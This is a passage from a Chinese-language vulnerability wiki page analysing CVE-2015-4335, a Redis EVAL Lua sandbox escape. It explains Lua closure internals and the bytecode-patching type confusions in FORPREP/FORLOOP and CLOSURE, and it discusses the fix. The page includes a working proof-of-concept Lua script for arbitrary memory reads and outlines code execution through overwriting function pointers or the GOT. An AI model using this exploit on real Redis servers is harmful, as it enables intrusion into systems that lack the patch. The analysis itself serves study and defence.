class="subst">\n</span>the result of running common test is:&quot;</span>)</span><br><span class="line"><span class="built_in">assert</span>(loadstring(<span class="string">&quot;print(<span class="subst">\&quot;</span>common test loadstring function.<span class="subst">\&quot;</span>)&quot;</span>))()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="operator">--</span> 直接生成一个全局函数</span><br><span class="line">local <span class="function"><span class="keyword">func</span> <span class="title">=</span> </span>loadstring(<span class="string">&quot;function func_test(str) print(<span class="subst">\&quot;</span>str = <span class="subst">\&quot;</span>, str) end&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="operator">--</span> 测试函数是否生成</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;<span class="subst">\n</span>before run func, functest =&quot;</span>, func_test)</span><br><span class="line"><span class="function"><span class="keyword">func</span>()</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;<span class="subst">\n</span>after run func, functest =&quot;</span>, func_test, <span class="string">&quot;<span class="subst">\n</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="operator">--</span> 测试参数chunkname的作用</span><br><span class="line"><span class="built_in">assert</span>(loadstring(<span class="string">&quot;i = i + 1&quot;</span>, <span class="string">&quot;third test&quot;</span>))()</span><br></pre></td></tr></table></figure>

<ul>
<li>由结果一可知，函数<code>loadstring()</code>与函数<code>loadfile()</code>一样，都是返回一个函数。</li>
<li>由结果二可知，返回函数的内容就是字符串参数<code>string</code>的内容，执行返回的函数时，字符串中的代码就被执行了。</li>
<li>结果三展示了这个函数的一般使用方法。</li>
<li>结果四展示了如何通过字符串生成一个全局函数，但是无法生成局部函数，并且生成的函数<code>func_test()</code>在调用完函数<code>func()</code>之后才被创建出来</li>
<li>最后一个例子展示了参数<code>chunkname</code>的作用，就是在错误的提示信息中起到提示作用。</li>
</ul>
<h4 id="lua数据结构–闭包"><a href="#lua数据结构–闭包" class="headerlink" title="lua数据结构–闭包"></a><strong>lua数据结构–闭包</strong></h4><p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/7.png"></p>
<p>闭包主要由以下2个元素组成：</p>
<p><strong>函数原型：</strong>上图意在表明是一段可执行代码。在Lua中可以是lua_CFunction，也可以是lua自身的虚拟机指令。</p>
<p>上下文环境：在Lua里主要是Upvalues和env，下面会有说明Upvalues和env。 在Lua里，我们也从闭包开始，逐步看出整个结构模型，下面是Closure的数据结构：(lobject.h 291-312)</p>
<p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/8.png"></p>
<p>​        Lua的闭包分成2类，一类是CClosure，即luaC函数的闭包。另一类是LClosure，是Lua里面原生的函数的闭包。</p>
<p>​        分析一下两类Closure相同部分ClosureHeader：</p>
<ul>
<li><p>CommonHeader：和与TValue中的GCHeader能对应起来的部分</p>
</li>
<li><p>isC：是否CClosure</p>
</li>
<li><p>nupvalues：外部对象个数</p>
</li>
<li><p>gclist：用于GC销毁</p>
</li>
<li><p>env：函数的运行环境</p>
</li>
</ul>
<p>对于CClosure数据结构：</p>
<ul>
<li><p>lua_CFunction f：函数指针，指向自定义的C函数</p>
</li>
<li><p>TValue upvalue[1]：C的闭包中，用户绑定的任意数量个upvalue</p>
</li>
</ul>
<p>对于LClosure数据结构：</p>
<ul>
<li><p>Proto *p：Lua的函数原型，在下面会有详细说明</p>
</li>
<li><p>UpVal *upvals：Lua的函数upvalue，这里的类型是UpVal，这里之所以不直接用TValue是因为具体实现需要一些额外数据。</p>
</li>
</ul>
<p><strong>UpVal的实现</strong></p>
<p>什么是UpVal？先来看看代码：</p>
<p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/9.png"></p>
<p>​        分析一下上面这段代码，最终testB的值显然是3+5+10=18。当调用testA(5)的时候，其实是在调用FuncB(5)，但是这个FuncB知道a = 3，这个是由<strong>FuncA调用时</strong>，记录到FuncB的<strong>外部变量</strong>，我们把a和c称为FuncB的upvalue。</p>
<p>​        下面描述一下<strong>Lua中的原生函数的函数原型</strong>，即<strong>Proto数据结构</strong>（lobject.h 231-253）：</p>
<p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/12.png"></p>
<ul>
<li><p>CommonHeader：Proto也是需要回收的对象，也会有与GCHeader对应的CommonHeader</p>
</li>
<li><p>TValue* k：函数使用的常量数组，比如local d = 10，则会有一个10的数值常量</p>
</li>
<li><p>Instruction *code：虚拟机指令码数组</p>
</li>
<li><p>Proto **p：函数里定义的函数的函数原型，比如funcA里定义了funcB，在funcA的5. Proto中，这个指针的[0]会指向funcB的Proto</p>
</li>
<li><p>int *lineinfo：主要用于调试，每个操作码所对应的行号</p>
</li>
<li><p>LocVar *locvars：主要用于调试，记录每个本地变量的名称和作用范围</p>
</li>
<li><p>TString **upvalues：一来用于调试，二来用于给API使用，记录所有upvalues的名称</p>
</li>
<li><p>TString *source：用于调试，函数来源，如c:\t1.lua@ main</p>
</li>
<li><p>sizeupvalues： upvalues名称的数组长度</p>
</li>
<li><p>sizek：常量数组长度</p>
</li>
<li><p>sizecode：code数组长度</p>
</li>
<li><p>sizelineinfo：lineinfo数组长度</p>
</li>
<li><p>sizep：p数组长度</p>
</li>
<li><p>sizelocvars：locvars数组长度</p>
</li>
<li><p>linedefined：函数定义起始行号，即function语句行号</p>
</li>
<li><p>lastlinedefined：函数结束行号，即end语句行号</p>
</li>
<li><p>gclist：用于回收</p>
</li>
<li><p>nups：upvalue的个数，其实在Closure里也有nupvalues，这里我也不太清楚为什么要弄两个，nups是语法分析时会生成的，而nupvalues是动态计算的。</p>
</li>
<li><p>numparams：参数个数</p>
</li>
<li><p>is_vararg：是否参数是”…”（可变参数传递）</p>
</li>
<li><p>maxstacksize：函数所使用的stacksize</p>
<p>​    Proto的所有参数都是在<strong>语法分析和中间代码生成时获取的</strong>，相当于编译出来的汇编码一样是不会变的，动态性是在Closure中体现的。</p>
</li>
</ul>
<h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><h4 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h4><p>​        利用到的漏洞分别为OP_FORPREP/OP_FORLOOP、OP_CLOSURE中的类型混淆，LUA提供了string.dump将一个lua函数dump为LUA字节码，同时loadstring函数加载字节码为LUA函数，通过操作LUA原始字节码可以使得LUA解释器进入特殊状态，甚至导致BUG发生。</p>
<p>具备任意地址读/写能力后是一定可以做代码执行的，目前想到如下两种方式。</p>
<p><strong>1) 覆写CClosure-&gt;f</strong></p>
<p>​        在lua中可以使用coroutine.wrap创建C函数闭包对象CClosure，其结构如下：</p>
<p>​        CClosure-&gt;f指向函数指针，调用其对应的源码为deps/lua/src/ldo.c 307-326：</p>
<p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/22.png"></p>
<p><strong>2) 覆写got</strong></p>
<p>​        Linux PWN常规思路，通过DynELF解析Binary，进一步解析libc，获取system地址并覆写至fputs.got；在lua中调用print(“id”)即可执行命令。</p>
<h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><p>​        利用到的漏洞分别为OP_FORPREP/OP_FORLOOP、OP_CLOSURE中的类型混淆，LUA提供了string.dump将一个lua函数dump为LUA字节码，同时loadstring函数加载字节码为LUA函数，通过操作LUA原始字节码可以使得LUA解释器进入特殊状态，甚至导致BUG发生。</p>
<p>​        这里以Redis 3.0.0版本进行分析。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!cpp</span><br><span class="line">asnum = loadstring(string.dump(function(x)</span><br><span class="line">  for i = x, x, 0 do</span><br><span class="line">    return i</span><br><span class="line">  end</span><br><span class="line">end):gsub(&quot;\96%z%z\128&quot;, &quot;\22\0\0\128&quot;))</span><br></pre></td></tr></table></figure>

<p>LUA字节码固定长度32bits，4字节，定义如下：</p>
<p>主要由op操作码、R(A)、R(B)、R(C)、R(Bx)、R(sBx)组成。A、B、C对应于LUA寄存器索引。</p>
<p>asnum函数可以将任意LUA对象转换为数字。（注：LUA5.1 64bitLinux环境）gsub函数将字节码<code>\96%z%z\128</code>替换为<code>\22\0\0\128</code>。</p>
<p><strong>1) OP_FORPREP/OP_FORLOOP</strong></p>
<p>​        lua中对for循环生成的字节码，利用luadec反编译工具查看.out文件的字节码如下：</p>
<p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/2.png"></p>
<p>​        可以看到for循环是由FORPREP、FORLOOP两条指令组合而来，对应的源码是deps/lua/src/lvm.c 的luaV_execute函数（line 654-680）：</p>
<p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/3.png"></p>
<p>​        在OP_FORPREP中，lua对参数进行类型检查，判断是否为number类型，若不是则触发错误；然而在OP_FORLOOP中，因已做过类型检查，便假定参数为number类型，并对其执行idx = idx + step操作，这导致任意类型到number类型的混淆。</p>
<p>​        如下修改字节码中的FORPREP指令<code>\96%z%z\128</code>为JMP指令<code>\22\0\0\128</code>，gsub函数将字节码<code>\96%z%z\128</code>替换为<code>\22\0\0\128</code>，如下。</p>
<p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/4.png"></p>
<p>​        正常情况下lua在forprep指令会检查参数是否为数字类型，并执行初始化，但是由于执行gsub函数后，forprep字节码被替换为JMP to 5，直接跳过OP_FORPREP中的类型检查，直接进入OP_FORLOOP (5)：</p>
<p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/5.png"></p>
<p>​        forloop指令直接将循环参数转换为lua_Number(double)类型，（因为正常情况下forprep已经检查过类型了），然后执行加法（+ 0），执行dojump return x；返回lua_Number。LUA使用TValue表示通用数据对象，格式如下:</p>
<table>
<thead>
<tr>
<th>Value(64bit)</th>
<th>tt(32bit)</th>
<th>padd(32bit)</th>
</tr>
</thead>
<tbody><tr>
<td>n</td>
<td><code>LUA_TNUMBER</code></td>
<td></td>
</tr>
<tr>
<td><code>GCObject *gc; -&gt; TString*</code></td>
<td><code>LUA_TSTRING</code></td>
<td></td>
</tr>
<tr>
<td><code>GCObject *gc; -&gt; Closure*</code></td>
<td><code>LUA_TFUNCTION</code></td>
<td></td>
</tr>
</tbody></table>
<p><strong>2) OP_CLOSURE</strong></p>
<p>​        LUA使用CLOSURE A Bx指令创建函数的一个实例(或闭包)。Bx是要实例化的函数在函数原型表中的函数编号。例如：closure 2 0 ，创建0号函数对象，结果保存到2号寄存器。对CLOSURE指令的处理位于deps/lua/src/lvm.c 的luaV_execute函数（line 723-742）：</p>
<p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/6.png"></p>
<p>​        line 731-737是对闭包的处理，具体为在CLOSURE指令后后生成对应的MOVE指令，MOVE指令的第二个参数为闭包变量引用。正常情况下引用只能指向当前栈桢中的局部变量，但通过修改字节码，可以将其指向至任意位置。</p>
<p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/13.png"></p>
<p>​        如上，通过修改”(\100%z%z%z)….”（MOVE 0 0）为”%1\0\0\0\1”（MOVE 0 2），将middle函数中的magic引用指向middle函数自身（R2），所以输出的结果为middle函数。</p>
<p>​        对函数调用的处理位于deps/lua/src/lvm.c line 586-606：</p>
<p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/14.png"></p>
<p>​         对函数返回的处理位于deps/lua/src/lvm.c line 382-390：</p>
<p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/15.png"></p>
<p>​        line 385将L-&gt;ci-&gt;func（当前函数指针）转换为Closure指针，由上文可知，通过修改字节码可以将闭包变量引用指向当前函数指针，导致任意类型到Closure类型的混淆。</p>
<p>​        基于此，结合number类型混淆，可以做任意地址读/写：</p>
<p>​        结尾处修改字节码，将middle/inner函数中的magic引用指向middle函数；inner函数中将magic赋值为字符串，这使得middle函数中的当前函数指针将被混淆为该字符串，函数返回； middle函数中读取闭包变量magic，读取闭包变量对应的源码为deps/lua/src/lvm.c line 427-431：</p>
<p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/16.png"></p>
<p>​        其实际上是去当前函数指针的upvals字段中获取相应引用，而当前函数指针已被混淆为字符串，对应的upvals字段可控。</p>
<p>TString类型与Closure类型的结构如下：</p>
<p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/17.png"></p>
<p>​        变量upval为字符串，as_double(upval)获取其TString指针，偏移24获取到upval-&gt;str地址，也就是说cl-&gt;p、cl-&gt;upvals[0]都指向输入的字符串”commonhead16bits” .. p32(lo) .. p32(hi)。</p>
<p>​        UpVal结构如下：</p>
<p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/18.png"></p>
<p>​        所以cl-&gt;upvals[0]-&gt;v指向构造的指针p32(lo) .. p32(hi)，也即为addr。</p>
<p>​        以上，便将任意地址的前8字节读取出来，写操作也是同理，只需要在middle函数中对magic赋值，需注意的是写操作实际会写入8字节数值及4字节tt类型：</p>
<p>​        deps/lua/src/lvm.c line 451-456：</p>
<p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/19.png"></p>
<p>​        deps/lua/src/lobject.h line 161-164：</p>
<p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/20.png"></p>
<p>触发poc.lua</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">#!cpp</span><br><span class="line">asnum = loadstring(string.dump(function(x)</span><br><span class="line">  for i = x, x, 0 do</span><br><span class="line">    return i</span><br><span class="line">  end</span><br><span class="line">end):gsub(&quot;\96%z%z\128&quot;, &quot;\22\0\0\128&quot;))</span><br><span class="line"></span><br><span class="line">ub4 = function(x) -- Convert little endian uint32_t to char[4]</span><br><span class="line">  local b0 = x % 256; x = (x - b0) / 256</span><br><span class="line">  local b1 = x % 256; x = (x - b1) / 256</span><br><span class="line">  local b2 = x % 256; x = (x - b2) / 256</span><br><span class="line">  local b3 = x % 256</span><br><span class="line">  return string.char(b0, b1, b2, b3)</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">f2ii = function(x) -- Convert double to uint32_t[2]</span><br><span class="line">  if x == 0 then return 0, 0 end</span><br><span class="line">  if x &lt; 0 then x = -x end</span><br><span class="line"></span><br><span class="line">  local e_lo, e_hi, e, m = -1075, 1023</span><br><span class="line">  while true do -- this loop is math.frexp</span><br><span class="line">    e = (e_lo + e_hi)</span><br><span class="line">    e = (e - (e % 2)) / 2</span><br><span class="line">    m = x / 2^e</span><br><span class="line">    if m &lt; 0.5 then e_hi = e elseif 1 &lt;= m then e_lo = e else break end</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  if e+1023 &lt;= 1 then</span><br><span class="line">    m = m * 2^(e+1074)</span><br><span class="line">    e = 0</span><br><span class="line">  else</span><br><span class="line">    m = (m - 0.5) * 2^53</span><br><span class="line">    e = e + 1022</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  local lo = m % 2^32</span><br><span class="line">  m = (m - lo) / 2^32</span><br><span class="line">  local hi = m + e * 2^20</span><br><span class="line">  return lo, hi</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">ii2f = function(lo, hi) -- Convert uint32_t[2] to double</span><br><span class="line">  local m = hi % 2^20</span><br><span class="line">  local e = (hi - m) / 2^20</span><br><span class="line">  m = m * 2^32 + lo</span><br><span class="line"></span><br><span class="line">  if e ~= 0 then</span><br><span class="line">    m = m + 2^52</span><br><span class="line">  else</span><br><span class="line">    e = 1</span><br><span class="line">  end</span><br><span class="line">  return m * 2^(e-1075)</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">read_mem = loadstring(string.dump(function(mem_addr) -- AAAABBBB 1094795585 1111638594</span><br><span class="line">  local magic=nil</span><br><span class="line">  local function middle()</span><br><span class="line">    local f2ii, asnum = f2ii, asnum</span><br><span class="line">    local lud, upval</span><br><span class="line">    local function inner()</span><br><span class="line">      magic = &quot;01234567&quot;</span><br><span class="line">      local lo,hi = f2ii(mem_addr)</span><br><span class="line">      upval = &quot;commonhead16bits&quot;..ub4(lo)..ub4(hi)</span><br><span class="line">      lo,hi = f2ii(asnum(upval));lo = lo+24</span><br><span class="line">      magic = magic..ub4(lo)..ub4(hi)..ub4(lo)..ub4(hi)</span><br><span class="line">    end</span><br><span class="line">    inner()</span><br><span class="line">    return asnum(magic)</span><br><span class="line">  end</span><br><span class="line">  magic = middle()</span><br><span class="line">  return magic</span><br><span class="line">end):gsub(&quot;(\164%z%z%z)....&quot;, &quot;%1\0\0\128\1&quot;, 1))  --&gt; move 0,3</span><br><span class="line"></span><br><span class="line">x=&quot;AAAABBBB&quot;</span><br><span class="line">l,h=f2ii(asnum(x))</span><br><span class="line">x=ii2f(l+24,h)</span><br><span class="line">print(f2ii(read_mem(x)))</span><br></pre></td></tr></table></figure>

<h4 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h4><p>​        漏洞是因为加载字节码导致的，Redis中的修复，直接禁止字节码加载：</p>
<p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/11.png"></p>
<h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>​        直接eval命令发lua字节码脚本</p>
<p><img src="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/10.png"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote>
<ul>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="http://redis.io/commands/ZADD">http://redis.io/commands/ZADD</a></li>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="http://benmmurphy.github.io/blog/2015/06/04/redis-eval-lua-sandbox-escape/">http://benmmurphy.github.io/blog/2015/06/04/redis-eval-lua-sandbox-escape/</a></li>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/redis/redis/commit/fdf9d455098f54f7666c702ae464e6ea21e25411">https://github.com/redis/redis/commit/fdf9d455098f54f7666c702ae464e6ea21e25411</a></li>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/viruscamp/luadec">https://github.com/viruscamp/luadec</a></li>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://juejin.cn/post/6844903572673396750">https://juejin.cn/post/6844903572673396750</a></li>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://gist.github.com/corsix/6575486">https://gist.github.com/corsix/6575486</a></li>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.bbsmax.com/A/mo5kZWW2Jw/">https://www.bbsmax.com/A/mo5kZWW2Jw/</a></li>
</ul>
</blockquote>

            </div>
        
        <footer class="article-footer">
        </footer>
    </div>
</article>


    
<nav id="article-nav">
    
        <a href="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
            <strong class="article-nav-caption">Newer</strong>
            <div class="article-nav-title">
                
                    CVE-2015-8080_Redis getnum整数溢出漏洞
                
            </div>
        </a>
    
    
        <a href="/wiki/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2013-7458-Redis-redis-cli%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
            <strong class="article-nav-caption">Older</strong>
            <div class="article-nav-title">CVE-2013-7458_Redis redis-cli信息泄露漏洞</div>
        </a>
    
</nav>





    
    




<!-- baidu url auto push script -->
<script type="text/javascript">
    !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=window.location.href,o=document.referrer;if(!e.test(r)){var n="//api.share.baidu.com/s.gif";o?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var t=new Image;t.src=n}}(window);
</script>     
</section>
        </div>
        <footer id="footer">
    <div class="outer">
        <div id="footer-info" class="inner">
            Tahir &copy; 2021 
            <a rel="external nofollow noopener noreferrer" target="_blank" href="http://creativecommons.org/licenses/by-nc-nd/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-nd/4.0/80x15.png"></a>
            <br> Powered by <a href="http://hexo.io/" target="_blank" rel="external nofollow noopener noreferrer">Hexo</a>. Theme - <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/zthxxx/hexo-theme-Wikitten">wikitten</a>
            
                <br>
                <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i> <span id="busuanzi_value_site_pv"></span></span>
                &nbsp;|&nbsp;
                <span id="busuanzi_container_site_pv"><i class="fa fa-user"></i> <span id="busuanzi_value_site_uv"></span></span>
            
        </div>
    </div>
</footer>
        

    
        
<script src="/libs/lightgallery/js/lightgallery.min.js"></script>

        
<script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>

        
<script src="/libs/lightgallery/js/lg-pager.min.js"></script>

        
<script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>

        
<script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>

        
<script src="/libs/lightgallery/js/lg-zoom.min.js"></script>

        
<script src="/libs/lightgallery/js/lg-hash.min.js"></script>

        
<script src="/libs/lightgallery/js/lg-share.min.js"></script>

        
<script src="/libs/lightgallery/js/lg-video.min.js"></script>

    
    
        
<script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>

    
    
        <script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true,
            TeX: {
                equationNumbers: {
                  autoNumber: 'AMS'
                }
            }
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script async src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
    



<!-- Custom Scripts -->

<script src="/js/main.js"></script>


    </div>
</body>
</html>